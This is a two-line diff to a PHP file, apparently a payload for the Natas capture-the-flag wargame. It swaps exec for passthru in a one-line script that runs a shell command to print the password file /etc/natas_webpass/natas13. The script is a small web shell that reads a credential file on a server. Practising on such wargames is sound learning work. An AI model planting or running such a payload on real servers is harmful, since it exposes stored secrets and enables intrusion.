@@ -1,2 +1,2 @@
 <?php
-    echo exec('cat /etc/natas_webpass/natas13');
+    echo passthru('cat /etc/natas_webpass/natas13');
